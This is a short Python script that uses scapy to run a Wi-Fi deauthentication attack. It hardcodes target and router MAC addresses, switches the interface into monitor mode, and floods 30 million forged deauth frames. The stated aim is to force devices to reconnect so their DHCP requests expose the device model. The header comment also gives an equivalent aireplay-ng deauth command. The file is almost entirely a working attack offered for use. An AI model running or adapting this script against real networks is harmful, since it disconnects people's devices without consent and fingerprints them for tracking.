# This file is for deauth attack on all connected devices so that when they connect again
# we can capture the DHCP Request Packet sent by them to the Router which has Host Parameter Field
# used for identifying the Device Model Name [ ex -  Oppo A31, Galaxy M50 , iPhone 7]

# DeAuthentication Command -- [ aireplay-ng --deauth 0 -c {Device MAC} -a {Router MAC} wlan0mon ]

from scapy.all import RadioTap, Dot11Deauth, Dot11,sendp
import scapy.all as scapy
from time import sleep
import subprocess
import os

target_mac  = "64:6E:E0:A1:7B:DD"
gateway_mac = "7E:75:15:03:45:EB"

currentDir = os.getcwd()

subprocess.run(["sh", currentDir+"/monitorMode.sh"], stdout=subprocess.DEVNULL)
print(" * Enabled Monitor Mode . . .")
interfaces = scapy.get_if_list()
print(interfaces)
dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
print(" * Sending Deauth Packets ---")
sendp(packet, count=30000000, iface='wlan0mon', verbose=1)
subprocess.run(["sh", currentDir+"/managedMode.sh"], stdout=subprocess.DEVNULL)
print(" * Switched to Managed Mode . . .")
